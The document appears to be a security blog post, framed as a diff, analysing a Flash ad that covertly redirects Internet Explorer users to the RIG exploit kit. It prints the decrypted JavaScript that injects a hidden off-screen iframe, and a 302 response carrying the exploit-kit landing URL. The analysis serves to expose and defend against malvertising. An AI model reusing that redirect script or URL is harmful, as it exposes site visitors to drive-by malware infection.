@@ -1,0 +1,87 @@
+A look at a double-dipping advertising network
+Online advertising is a multi-billion dollar industry that has evolved over time in how it reaches consumers.
+Generic pop-ups have largely been replaced with tailor-made ads based on the person’s geolocation, tastes, habits, etc.
+As with any other lucrative business, there are going to be miscreants who try to abuse the system. A study published by the Wall Street Journal shows that one-third of all Internet traffic is bogus.
+In this post we are going to take a look at a particular ad network doing what we could call ‘double dipping’, in a rather stealth manner to avoid detection.
+Using what appears to be a normal Flash-based ad, they are surreptitiously redirecting users to a malicious website.
+A typical Flash advertisement
+Most rich ads are built with Adobe Flash, a technology that allows ads to be animated, play sounds, and that can be interacted with. Take this ad (0/53 detection on VT):
+
+Typically, someone who visits a website may look at the ad and, if interested, might click on it. Both the site owner and the advertising network will earn a commission for leading a potential customer to a brand/store.
+The Flash ad is displayed in the browser thanks to this code:
+
+You can see certain properties such as height, width and of course the hyperlink if the user clicks on the image.
+Static analysis basics
+Sometimes, to better understand how something works, you need to take it apart. Again, many tools are available but you may want to try out Adobe’s own SWF Investigator.
+
+The program is like a Swiss knife to dissect a Flash (SWF) file and learn more about it. For example you can check the file’s metadata and learn when it was created:
+
+Decompiling to source code
+Flash libraries and code render the content you see in your browser. ActionScript 3 is the latest programming language for the Adobe Flash Player; ActionScript itself was first developed by Macromedia Inc. then bought out by Adobe.
+In order to see the ad’s source code, you need to decompile its SWF file. Many utilities are available such as SWFTools or you can also do it online.
+
+The code may look familiar if you know a little bit about JavaScript and indeed you could say that they are distant cousins since ActionScript is a dialect of ECMAScript, a language used for client-side scripting on the web.
+While you may be able to parse the code and even run it as if it were JavaScript, you can run into limitations. For that reason, you may want to use a full fledged debugger.
+Debugging the code line by line
+Flash Builder is Adobe’s corporate-grade program that you can evaluate for 60 days before buying. Be warned that the specs for running the program are pretty high (in case you wanted to run it inside a Virtual Machine).
+Without wasting too much time, let’s get to the point of this blog post. Here’s what we know so far:
+
+There is a malicious redirection happening after the SWF is displayed.
+There does not seem to be an exploit in the SWF itself.
+
+A set of “if” statements looks suspicious:
+
+The code checks that:
+
+The screen resolution is at least greater than 400 or 600 pixels.
+The operating system is Microsoft Windows.
+The system is not a debugger.
+ActiveX settings are enabled.
+
+Then someone doesn’t want us to know what they are doing with a particular variable called _local2 and went through the trouble of obfuscating it:
+
+Next is this interesting “while” loop that does strange calculations on the variable:
+
+which in fact are not so strange at all. If you Google “1103515245” you will find out that it is a multiplier used in random numbers generation.
+Spotting the intruder
+There are certain strings/functions in Flash that are deemed potentially dangerous:
+
+Loader
+ExternalInterface
+navigateToURL
+currentDomain
+loadBytes
+
+Perhaps we tend to forget sometimes that Flash ads are actually applications which can perform certain undesired actions. One of them is redirecting the browser to a potentially harmful site.
+Following on our code analysis, we find a call that looks to be the answer to our investigation:
+ExternalInterface.call(gfhmyhopodofslp);
+If the container is an HTML page, this method invokes a JavaScript function in a <script> element. (source)
+The while loop described above decrypts the obfuscated string using the rand method and then converts it to characters:
+var _ua=navigator.userAgent.toLowerCase(),d,f;(_ua.indexOf("msie")!=-1||_ua.indexOf("trident")!=-1&&_ua.indexOf("rv:11"))&&(d=document.createElement("div"),d.id="idiv1",document.body.appendChild(d),f=document.createElement("iframe"),f.width="100px",f.height="100px",f.setAttribute("style","width:100px;height:100px;position:absolute;left:-10000px;top:0;"),f.setAttribute("src","?p=12"),document.getElementById("idiv1").appendChild(f))
+Now this all makes sense. The Flash file creates an iframe for a URL (/?p=12) on the same domain as the advertising server itself. A simple 302 redirection is then used to send the user to an exploit kit landing page:
+HTTP/1.1 302 Moved Temporarily
+Server: cloudflare-nginx
+Date: Sun, 22 Jun 2014 15:23:22 GMT
+Content-Type: text/html
+Connection: keep-alive
+X-Powered-By: PHP/5.4.29
+Location: http://mimokosikas.mediaartistgroup.com/?PHPSSESID=njrMNruDMhzIFIDALOXES7tHNErPThnJkpDZw-4|ZTIzNjJkNWFhMjM4MzcwNTczZmUyY2NhNWE3MzYwNDI
+CF-RAY: 13e9725ac503092c-DFW
+Content-Length: 0
+The exploit kit delivered is known as RIG EK. After exploiting Flash (a real exploit this time), Silverlight it drops a malicious binary detected as Trojan.Agent.ED by Malwarebytes Anti-Malware.
+
+If you were a website owner and allowed this advertising network to insert its ads on your site you would be unknowingly (or not, if the owner is part of the scheme) infecting your visitors.
+For the ad network, this is a double source of revenues: Ad impressions and pay per click as well as commissions per malware install.
+To go unnoticed the ad network employed several strategies:
+
+A benign redirection inside of the ad (the SWF file is clean of exploits or other malicious URLs).
+The URL it is calling is not supposed to be known from anybody else.
+A check ignores debuggers and other non compatible systems.
+The redirection only happens once per IP address making re-playability harder.
+
+At the end of the day, this is yet another case of malvertising. This particular ad may have been placed on a number of websites, big and small and leading to several thousand infections.
+This ad network which sports fake registration details and hides being CloudFlare has been identified before as rogue by several other security researchers.
+To protect against this type of threats you may wish to disable Flash or use NoScript (or an equivalent for your favourite browser). This may degrade your web browsing experience but is a pretty effective method of avoiding many web threats.
+Another option that lets you fully enjoy the web but also protects you from its pitfalls is our own Malwarebytes Anti-Exploit product.
+Special thanks to Jerome Dangu, CTO at ClarityAd for research assistance.
+@jeromesegura
